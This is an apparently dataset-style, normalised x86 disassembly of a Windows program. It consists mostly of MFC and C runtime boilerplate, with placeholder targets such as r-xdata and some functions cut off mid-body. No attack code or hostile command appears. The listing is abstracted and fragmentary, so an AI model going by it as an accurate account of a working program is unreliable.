cmp [ esi ] bl
je r-xdata
call sub_422d64
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx ]
call [ eax + 0xb8 ]
test eax eax
je r-xdata
push ebx
push 0x1
call eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esi + 0x30 ]
mov edi [ UnhookWindowsHookEx@IAT ]
cmp eax ebx
je r-xdata
mov [ edi ] ebx
mov eax [ esi + 0x2c ]
cmp eax ebx
je r-xdata
push eax
call edi
mov [ esi + 0x30 ] ebx
push eax
call edi
mov [ esi + 0x2c ] ebx
sub_401160
mov eax r--data
retn
sub_401170
push esi
mov esi ecx
push 0x0
call sub_422372
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_401190
retn 0x4
sub_4011a0
push esi
mov esi ecx
call j_sub_4224bc
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
add esp 0x4
j_sub_4224bc
jmp sub_4224bc
sub_4011d0
call sub_4011e0
jmp sub_4011f0
sub_4011e0
mov ecx rw-data
jmp sub_401170
sub_4011f0
push sub_401200
call sub_40bc2c
pop ecx
retn
sub_401200
mov ecx rw-data
jmp j_sub_4224bc
sub_4024fe
push [ eax - 0xfb274ff ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_402512
mov eax 0x1
retn
sub_4025b9
mov eax 0x1
retn
sub_4025e0
push esi
push 0x0
mov esi ecx
push 0x64
call sub_41bc2c
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_402600
mov eax [ ecx + 0x1c ]
push 0x0
push eax
call [ EnableWindow@IAT ]
retn
sub_402610
mov eax [ ecx + 0x1c ]
push 0x1
push eax
call [ EnableWindow@IAT ]
retn
sub_402620
push esi
mov esi ecx
call j_sub_41b9b4
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
add esp 0x4
j_sub_41b9b4
jmp sub_41b9b4
sub_402650
retn 0x4
sub_402660
mov eax r--data
retn
sub_4026e0
mov eax r--data
retn
sub_402b10
mov eax [ ecx + 0x5c ]
retn
sub_402b20
call sub_41cb32
mov eax [ esp + 0x4 ]
and [ eax + 0x18 ] 0xffffffbf
retn 0x4
GetAdaptersInfo
jmp [ GetAdaptersInfo@IAT ]
sub_403bba
push [ esp + 0x4 ]
call sub_41b82f
pop ecx
retn 0x4
sub_403bc7
mov eax [ ecx ]
jmp [ eax + 0xc4 ]
sub_403bd7
retn 0x4
sub_403bda
call sub_403be4
jmp sub_403be5
sub_403be4
retn
sub_403be5
push sub_403bf1
call sub_40bc2c
pop ecx
retn
sub_403c00
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
call sub_422d64
mov [ eax + 0x1038 ] esi
pop esi
retn
push sub_4044d3
mov ecx rw-data
call sub_42360a
mov esi eax
sub_403d01
push [ esp + 0x10 ]
mov ecx [ esp + 0x8 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_404fb5
retn 0x10
sub_4044d3
push 0x4
call sub_423143
test eax eax
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
retn
sub_4044e8
push esi
mov esi ecx
call sub_404503
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_423161
sub_404503
retn
sub_404504
mov eax ecx
mov ecx [ rw-data ]
mov [ eax + 0x14 ] ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x18 ] 0x5c
retn
sub_404525
push esi
mov esi ecx
call sub_404541
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_4045bd
push [ ecx + 0xc ]
call [ FindClose@IAT ]
retn
sub_4046a7
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
xor eax eax
mov eax [ eax ]
and eax [ esp + 0x4 ]
neg eax
sbb eax eax
neg eax
jmp r-xdata
retn 0x4
sub_40489b
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
add ecx 0x14
push ecx
mov ecx [ ebp + 0x8 ]
call sub_41c0cd
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_404c6a
mov eax [ ecx + 0x20 ]
test eax eax
jne r-xdata
push eax
call sub_41cbcb
retn
push [ ecx + 0x1c ]
call [ GetParent@IAT ]
sub_404c81
call sub_422d64
mov ecx [ eax + 0x4 ]
jmp sub_41b5bc
sub_404c8e
push esi
mov esi ecx
call sub_404caa
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_404caa
mov eax sub_425ff4
call sub_40cc20
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_41f58a
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_404cd3
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_41f63e
mov eax [ esp + 0xc ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
mov [ esi + 0x94 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x8
sub_404cfd
push esi
mov esi ecx
call sub_404d19
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_404d19
mov [ ecx ] r--data
retn
sub_404d20
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_41f63e
mov eax [ esp + 0xc ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
mov [ esi + 0x94 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x8
sub_404d4a
push esi
mov esi ecx
call sub_404d66
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_404d66
mov [ ecx ] r--data
retn
sub_404d6d
push esi
mov esi ecx
call sub_404d89
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_404d89
mov eax sub_4260d0
call sub_40cc20
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_421292
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_404db2
push [ esp + 0x8 ]
push [ esp + 0x8 ]
push [ ecx + 0x4 ]
call [ PtVisible@IAT ]
retn 0x8
sub_404dc6
push [ esp + 0x4 ]
push [ ecx + 0x4 ]
call [ RectVisible@IAT ]
retn 0x4
sub_404dd6
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ TextOutA@IAT ]
retn 0x10
sub_404e4f
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ DrawTextA@IAT ]
retn 0x10
sub_404e9b
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ Escape@IAT ]
retn 0x10
sub_404eb7
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_41f63e
mov eax [ esp + 0xc ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
mov [ esi + 0x94 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x8
sub_404ee1
push esi
mov esi ecx
call sub_404efd
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_404efd
mov [ ecx ] r--data
retn
sub_404f04
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_41f63e
mov eax [ esp + 0xc ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
mov [ esi + 0x94 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x8
sub_404f2e
push esi
mov esi ecx
call sub_404f4a
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_404f4a
mov [ ecx ] r--data
retn
sub_404f51
push esi
mov esi ecx
call sub_404f6d
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_40516b
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x20 ]
call sub_41f64a
mov [ ebp - 0x14 ] 0x80020009
mov eax r-xdata
retn
push [ ebp - 0x20 ]
push eax
call sub_42517c
sub_405274
mov ecx [ ebp - 0x18 ]
call sub_41f64a
mov eax r-xdata
retn
sub_4052e5
mov eax r--data
retn
sub_4052eb
mov eax r--data
retn
sub_405350
push esi
mov esi ecx
call sub_40536c
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_4054e0
mov ecx [ ebp - 0x1c ]
call sub_41f64a
mov eax r-xdata
retn
sub_405931
push esi
mov esi ecx
call sub_40594d
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_40594d
mov eax sub_426210
call sub_40cc20
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_421292
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_405a2f
mov eax [ ecx + 0x48 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
retn 0x4
and [ ecx + 0x48 ] 0x0
sub_405aa4
push ebp
mov ebp esp
mov eax [ ecx ]
lea edx [ ebp + 0x8 ]
push edx
push [ ebp + 0x8 ]
call [ eax + 0x6c ]
push [ ebp + 0x8 ]
call sub_41cbcb
pop ebp
retn 0x4
sub_405ba9
mov eax [ ecx ]
push [ esp + 0x4 ]
call [ eax + 0x70 ]
test eax eax
je r-xdata
retn 0xc
push [ esp + 0xc ]
mov ecx eax
push [ esp + 0xc ]
call sub_41f1f8
sub_405bc8
mov eax [ ecx ]
push [ esp + 0x4 ]
call [ eax + 0x70 ]
test eax eax
je r-xdata
retn 0x10
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ eax + 0x1c ]
call [ SendMessageA@IAT ]
sub_405c2a
mov eax [ ecx ]
push [ esp + 0x4 ]
call [ eax + 0x70 ]
test eax eax
je r-xdata
retn 0x8
push [ esp + 0x8 ]
mov ecx eax
call sub_41f1d1
sub_405caf
mov ecx [ ebp - 0x14 ]
call sub_41f64a
and [ ebp + 0x8 ] 0x0
mov eax r-xdata
retn
sub_405cc1
push [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push [ esp + 0xc ]
lea ecx [ eax - 0x4c ]
call sub_42420f
retn 0xc
sub_405cd8
mov eax [ esp + 0x4 ]
add eax 0xffffffb8
push eax
call [ InterlockedIncrement@IAT ]
retn 0x4
sub_405ce9
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x4c ]
call sub_4240c4
retn 0x4
sub_405cf8
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
mov eax [ eax - 0x30 ]
mov eax [ eax + 0x1c ]
mov [ ecx ] eax
xor eax eax
retn 0x8
sub_405d44
mov eax 0x80004001
retn 0x10
sub_405d4c
xor eax eax
retn 0x8
sub_405d51
mov eax r--data
retn
sub_405dad
push esi
mov esi ecx
call sub_405d57
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_405de7
push [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push [ esp + 0xc ]
lea ecx [ eax - 0x50 ]
call sub_42420f
retn 0xc
sub_405dfe
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x50 ]
call sub_4240c4
retn 0x4
sub_405e0d
mov eax [ esp + 0x4 ]
add eax 0xffffffb4
push eax
call [ InterlockedIncrement@IAT ]
retn 0x4
sub_405e1e
mov eax 0x80004001
retn 0x14
sub_405edf
mov [ ebp - 0x18 ] 0x8007000e
mov eax sub_405eec
retn
sub_405f34
push 0x0
push 0x0
push 0x31
push [ ecx + 0x1c ]
call [ SendMessageA@IAT ]
push eax
call sub_421253
retn
sub_405f4a
mov eax r--data
retn
sub_406057
push esi
mov esi ecx
call sub_406073
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_406a4b
mov eax [ ecx + 0x28 ]
retn
sub_406a7b
test [ ecx + 0x71 ] 0x10
je r-xdata
xor eax eax
push 0x1
pop eax
test [ ecx + 0x6c ] al
jne r-xdata
retn
sub_406a8c
test [ ecx + 0x71 ] 0x10
je r-xdata
xor eax eax
retn
mov eax [ ecx + 0x6c ]
and al 0x1
neg al
sbb eax eax
and al 0xf0
add eax 0x20
retn
sub_40703c
push 0x0
mov eax [ ecx ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push 0x2
push [ esp + 0x14 ]
push ecx
call [ eax + 0x60 ]
add esp 0x18
retn 0xc
sub_407058
mov ecx [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
push edx
push [ esp + 0x10 ]
mov eax [ ecx ]
push [ esp + 0x10 ]
call [ eax + 0x5c ]
retn
sub_4070b0
mov ecx [ ebp - 0x14 ]
call sub_41f64a
and [ ebp + 0x10 ] 0x0
mov eax r-xdata
retn
sub_407121
mov ecx [ ebp - 0x20 ]
call sub_41f64a
mov eax sub_40712f
retn
sub_40716a
mov ecx [ ebp - 0x20 ]
call sub_41f64a
mov eax r-xdata
retn
sub_4071d2
mov ecx [ ebp - 0x1c ]
call sub_41f64a
mov eax r-xdata
retn
sub_40732d
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x10 ] esp
call sub_41f64a
mov ecx [ ebp - 0x14 ]
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x2
mov eax [ ecx ]
push 0x8
push 0xfffffdfb
call [ eax + 0x64 ]
mov eax r-xdata
retn
sub_407354
mov ecx [ ebp - 0x18 ]
call sub_41f64a
mov eax r-xdata
retn
sub_407402
mov edx [ esp + 0x4 ]
mov eax [ ecx + 0x28 ]
mov [ ecx + 0x28 ] edx
retn 0x4
sub_4075bd
mov ecx [ ebp - 0x18 ]
call sub_41f64a
mov eax r-xdata
retn
sub_40761f
mov ecx [ ebp - 0x18 ]
call sub_41f64a
mov [ ebp - 0x14 ] 0x1
mov eax r-xdata
retn
sub_407879
mov eax [ esp + 0x4 ]
add eax 0xffffff4c
push eax
call [ InterlockedIncrement@IAT ]
retn 0x4
sub_40788c
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0xb8 ]
call sub_4240c4
retn 0x4
sub_40789e
push [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push [ esp + 0xc ]
lea ecx [ eax - 0xb8 ]
call sub_42420f
retn 0xc
sub_4078b8
push [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
mov ecx [ eax - 0x9c ]
push r--data
call sub_42420f
retn 0x8
sub_4078d3
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0xb8 ]
call sub_406ea3
xor eax eax
retn 0x4
sub_4078e7
mov eax [ esp + 0x4 ]
add eax 0xffffff48
push eax
call [ InterlockedIncrement@IAT ]
retn 0x4
sub_4078fa
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0xbc ]
call sub_4240c4
retn 0x4
sub_40790c
push [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push [ esp + 0xc ]
lea ecx [ eax - 0xbc ]
call sub_42420f
retn 0xc
sub_407951
mov eax [ esp + 0x4 ]
add eax 0xffffff44
push eax
mov ecx [ eax + 0x1c ]
mov edx [ ecx ]
call [ edx + 0x5c ]
xor eax eax
retn 0x4
sub_4079e0
push 0x1
pop eax
retn 0xc
sub_4079e6
mov eax [ esp + 0x4 ]
add eax 0xffffff44
push eax
mov ecx [ eax + 0x1c ]
mov edx [ ecx ]
call [ edx + 0x60 ]
xor eax eax
retn 0x8
sub_4079fd
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0xbc ]
call sub_406ee0
xor eax eax
retn 0x4
sub_407a11
mov eax [ esp + 0x4 ]
mov eax [ eax - 0x6c ]
push eax
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor eax eax
retn 0x4
sub_407a76
mov eax [ esp + 0x4 ]
add eax 0xffffff44
push eax
call [ InterlockedIncrement@IAT ]
retn 0x4
sub_407a89
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0xc0 ]
call sub_4240c4
retn 0x4
sub_407a9b
push [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push [ esp + 0xc ]
lea ecx [ eax - 0xc0 ]
call sub_42420f
retn 0xc
sub_407ab5
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0xc0 ]
call sub_406d34
xor eax eax
retn 0x4
sub_407ac9
mov eax 0x80004001
retn 0x8
sub_407bd3
mov eax 0x80004001
retn 0xc
sub_407bdb
mov eax 0x80004001
retn 0x4
sub_407be3
mov eax [ esp + 0x4 ]
add eax 0xffffff40
push eax
call [ InterlockedIncrement@IAT ]
retn 0x4
sub_407bf6
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0xc4 ]
call sub_4240c4
retn 0x4
sub_407c08
push [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push [ esp + 0xc ]
lea ecx [ eax - 0xc4 ]
call sub_42420f
retn 0xc
sub_407e08
push 0x1
pop eax
retn 0x4
sub_407e72
mov eax 0x80004001
retn 0x18
sub_4088a7
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov edx [ eax ]
add ecx 0x4
push ecx
push rw-data
push eax
call [ edx ]
sub_40899c
mov eax r-xdata
retn
sub_408a01
mov eax r-xdata
retn
sub_408af5
mov eax r-xdata
retn
sub_408b9f
mov eax r-xdata
retn
sub_40989c
mov eax [ esp + 0x4 ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + edx + 0x4 ]
add eax [ ecx + 0x8 ]
retn 0x4
sub_40a3e2
push esi
mov esi ecx
push [ esi + 0xc ]
call sub_41b82f
push [ esi + 0x24 ]
call sub_41b82f
pop ecx
pop ecx
pop esi
retn
sub_40a445
mov eax r-xdata
retn
sub_40a55c
mov dx [ esp + 0xc ]
mov eax ecx
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] dx
mov edx [ esp + 0x8 ]
mov [ eax + 0xc ] ecx
mov [ eax + 0x14 ] ecx
mov ecx [ esp + 0x4 ]
mov [ eax + 0x8 ] edx
mov [ eax + 0x18 ] ecx
retn 0xc
sub_40a582
mov eax [ esp + 0x4 ]
mov [ ecx ] eax
retn 0x4
sub_40a58b
mov eax [ esp + 0x4 ]
cmp [ ecx + 0xc ] eax
je r-xdata
retn 0x4
mov [ ecx + 0xc ] eax
call sub_40a5a3
sub_40a59f
mov eax [ ecx + 0x18 ]
retn
sub_40a693
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0xd0 ]
call sub_4240ab
retn 0x4
sub_40a6a5
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0xd0 ]
call sub_4240ee
retn 0x4
sub_40a6b7
push [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push [ esp + 0xc ]
lea ecx [ eax - 0xd0 ]
call sub_424251
retn 0xc
sub_40a6d1
push [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
push [ esp + 0x10 ]
lea ecx [ eax - 0xd0 ]
push [ esp + 0x10 ]
call sub_40a65c
retn 0x10
sub_40a795
push 0x2
mov ecx [ esp + 0x8 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_40a8f6
test eax eax
jl r-xdata
retn 0x10
xor eax eax
sub_40a7ff
push 0x4
mov ecx [ esp + 0x8 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_40a8f6
test eax eax
jl r-xdata
retn 0x10
xor eax eax
sub_40a81f
push 0x5
mov ecx [ esp + 0x8 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_40a8f6
test eax eax
jl r-xdata
retn 0x10
xor eax eax
sub_40ac29
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
j_sub_42548e
jmp sub_42548e
sub_40ac64
push ecx
call [ VariantClear@IAT ]
retn
sub_40ac6c
mov eax ecx
mov ecx [ esp + 0x4 ]
or [ eax + 0x4 ] 0xffffffff
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x18 ] ecx
mov [ eax + 0x1c ] ecx
mov [ eax + 0x20 ] ecx
retn 0x4
sub_40ac8f
push [ esp + 0x4 ]
add ecx 0xc
call sub_41c49d
retn 0x4
sub_40b608
mov ecx [ ebp + 0xc ]
call sub_41f64a
mov eax r-xdata
retn
sub_40b692
push esi
mov esi ecx
call sub_40b6a6
add esi 0x10
push esi
call [ DeleteCriticalSection@IAT ]
pop esi
retn
sub_40b789
push esi
mov esi ecx
call sub_40b7a5
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_40b7a5
mov eax sub_4265e0
call sub_40cc20
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
add ecx 0x10
call sub_41c358
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_40b7d1
mov eax [ esp + 0x4 ]
test eax eax
jge r-xdata
retn 0x4
cmp eax 0x8007000e
jne r-xdata
push eax
call sub_424277
call sub_41a429
jmp r-xdata
sub_40b7f0
push esi
mov esi ecx
push esi
call sub_40b948
push [ esp + 0x8 ]
push esi
call [ VariantCopy@IAT ]
push eax
call sub_40b7d1
mov eax esi
pop esi
retn 0x4
sub_40b92e
push esi
mov esi ecx
push [ esp + 0x8 ]
push esi
call [ VariantCopy@IAT ]
push eax
call sub_40b7d1
mov eax esi
pop esi
retn 0x4
sub_40b948
push 0x10
push 0x0
push [ esp + 0xc ]
call sub_40cc70
add esp 0xc
retn 0x4
sub_40bac3
push esi
mov esi ecx
call sub_40badf
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_40badf
mov [ ecx ] r--data
retn
sub_40bc2c
push [ esp + 0x4 ]
call sub_40bbae
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
sub_40bca1
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_40bca8
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_40bed0
push 0x1
pop eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40bf74
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_40bffe
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_40bf74
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_40c02a
push ebx
push ecx
mov ebx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
pop ecx
pop ebx
retn 0x4
sub_40c205
push 0x40
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_40c1d4
add esp 0xc
retn
sub_40c51f
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
push eax
call [ Sleep@IAT ]
retn
push 0x1
pop eax
sub_40c731
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
mov eax [ ecx + 0x1c ]
push eax
mov eax [ ecx + 0x18 ]
push eax
call sub_40bf96
add esp 0x8
pop ebp
retn 0x4
sub_40c77d
push [ esp + 0x4 ]
call sub_40c74c
pop ecx
retn
sub_40c7b7
mov eax [ rw-data ]
test eax eax
je r-xdata
push rw-data
push rw-data
call sub_40c8bd
push rw-data
push rw-data
call sub_40c8bd
add esp 0x10
retn
call eax
sub_40c7e4
push 0x0
push 0x0
push [ esp + 0xc ]
call sub_40c806
add esp 0xc
retn
sub_40c7f5
push 0x0
push 0x1
push [ esp + 0xc ]
call sub_40c806
add esp 0xc
retn
sub_40c8ab
push 0xd
call sub_40e83e
pop ecx
retn
sub_40c8b4
push 0xd
call sub_40e89f
pop ecx
retn
sub_40cbb5
cmp [ rw-data ] 0x1
jne r-xdata
push [ esp + 0x4 ]
call sub_41248c
pop ecx
push 0xff
call [ ExitProcess@IAT ]
call sub_412453
sub_40cc02
push esi
mov esi ecx
call sub_40cbd9
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_40cc20
push 0xffffffff
push eax
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0xc ]
mov [ fs : 0x0 ] esp
mov [ esp + 0xc ] ebp
lea ebp [ esp + 0xc ]
push eax
retn
sub_40d816
mov eax [ esp + 0x4 ]
push 0x0
movzx eax [ eax ]
test [ eax + rw-data ] 0x4
pop eax
setne al
inc eax
retn
sub_40df12
cmp [ rw-data ] 0x0
jne r-xdata
retn
push 0xfffffffd
call sub_40db3a
pop ecx
mov [ rw-data ] 0x1
sub_40df2e
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_40df45
add esp 0x10
retn
sub_40e14a
push 0x1
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_40df45
add esp 0x10
retn
sub_40e1e7
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_40e161
mov eax [ esp + 0x18 ]
add esp 0x10
retn
sub_40e202
call sub_40e21a
call sub_4131a5
mov [ rw-data ] eax
call sub_413155
fnclex
retn
sub_40e219
retn
sub_40e21a
mov eax sub_41357e
mov [ rw-data ] sub_413228
mov [ rw-data ] eax
mov [ rw-data ] sub_41328e
mov [ rw-data ] sub_4131ce
mov [ rw-data ] sub_413276
mov [ rw-data ] eax
retn
sub_40e2dd
push 0x1
push [ esp + 0x8 ]
call sub_40e2eb
pop ecx
pop ecx
retn
sub_40e815
push esi
mov esi [ InitializeCriticalSection@IAT ]
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
pop esi
retn
sub_40f7af
push [ ebp - 0x14 ]
call sub_40f7e6
pop ecx
retn
sub_40f7e6
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
je r-xdata
jmp sub_40fd2a
xor eax eax
retn
sub_40f91c
push [ ebp - 0x14 ]
call sub_40f992
pop ecx
retn
sub_40fb74
push 0x1
pop eax
retn
sub_40fb78
mov esp [ ebp - 0x18 ]
jmp sub_40fd2a
sub_40fbd6
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_40fbdf
mov esp [ ebp - 0x18 ]
jmp sub_40fd2a
sub_40fcb0
mov eax [ esp + 0x4 ]
mov [ eax + 0x50 ] rw-data
mov [ eax + 0x14 ] 0x1
retn
sub_40fd72
push 0x1
pop eax
retn
sub_40fdc8
push 0x1
pop eax
retn
sub_4106d8
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
retn
sub_4106e5
mov eax [ esp + 0x4 ]
add [ eax ] 0x8
mov ecx [ eax ]
mov eax [ ecx - 0x8 ]
mov edx [ ecx - 0x4 ]
retn
sub_4106f5
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov ax [ eax - 0x4 ]
retn
sub_4107ab
call sub_4109f8
cmp [ rw-data ] 0x0
je r-xdata
retn
jmp sub_413efe
sub_4109f8
push 0x1
call sub_410a01
pop ecx
retn
sub_4115b0
mov edx [ esp + 0x4 ]
dec [ edx + 0x4 ]
js r-xdata
push edx
call sub_41190c
pop ecx
retn
mov ecx [ edx ]
movzx eax [ ecx ]
inc ecx
mov [ edx ] ecx
retn
sub_4115ca
cmp [ esp + 0x4 ] 0xffffffff
je r-xdata
retn
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call sub_41446f
pop ecx
pop ecx
sub_412b8a
push 0x1
pop eax
retn
sub_412c3e
push 0x1
pop eax
retn
sub_412e77
push 0x1
pop eax
retn
sub_412f0d
push sub_412ec7
call [ SetUnhandledExceptionFilter@IAT ]
mov [ rw-data ] eax
retn
sub_412f1e
push [ rw-data ]
call [ SetUnhandledExceptionFilter@IAT ]
retn
sub_413155
push 0x30000
push 0x10000
call sub_414aea
pop ecx
pop ecx
retn
sub_413276
mov eax [ esp + 0x4 ]
fld [ eax ]
fcomp [ r--data ]
fnstsw ax
sahf
jb r-xdata
xor eax eax
retn
push 0x1
pop eax
retn
sub_4138a9
push esi
push 0xb
call sub_40e83e
push [ esp + 0xc ]
call sub_4138ca
push 0xb
mov esi eax
call sub_40e89f
add esp 0xc
mov eax esi
pop esi
retn
sub_413c90
